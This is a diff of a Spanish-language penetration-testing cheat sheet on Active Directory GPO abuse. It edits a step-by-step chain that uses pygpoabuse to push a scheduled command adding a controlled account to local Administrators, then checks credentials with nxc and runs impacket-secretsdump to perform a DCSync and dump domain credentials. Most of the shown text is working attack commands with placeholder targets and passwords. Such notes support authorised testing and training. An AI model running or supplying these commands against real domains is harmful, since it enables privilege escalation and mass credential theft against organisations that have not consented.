@@ -25,7 +25,8 @@ Paso 1:
 # Abusar de una GPO sobre la que el usuario tiene permisos de modificación, agregando un comando que se ejecutará cuando la GPO se aplique.
 ❯ python3 pygpoabuse.py <DOMAIN>/<USER>:'<PASS>' -gpo-id <GPO-GUID> -command 'net localgroup Administrators <ControlledAccount> /add' -dc-ip IP_DC -f
 
-	# GPO-GUID = 6AC1786C-016F-11D2-945F-00C04FB984F9
+Esto se encuentra en Bloodhound como Distinguished Name:
+	# GPO-GUID = 6AC1786C-016F-11D2-945F-00C04FB984F9=
 	# command = Asignar al usuario ControlledAccount cuenta privilegiada 
 	# f = Forzar una tarea programada de forma privilegiada 
 
@@ -36,12 +37,13 @@ Paso 2:
 
 NOTA: 
 	- El cambio no es instantaneo, se debe esperar unos minutos 
-	- Pero si tarda mucho, volver a ejecutar el comando varias veces 
+	- Pero si tarda mucho, volver a ejecutar el comando de 'pygpoabuse' al menos dos veces  
 ```
 
 ```bash 
 Paso 3:
 # Ejecutar un DCSync 
+❯ nxc smb IP_DC -u user -p 'P@$$w0rd123!' 
 ❯ impacket-secretsdump 'domain.local/user:P@$$w0rd123!'@IP-DC 
 
 Paso 4:
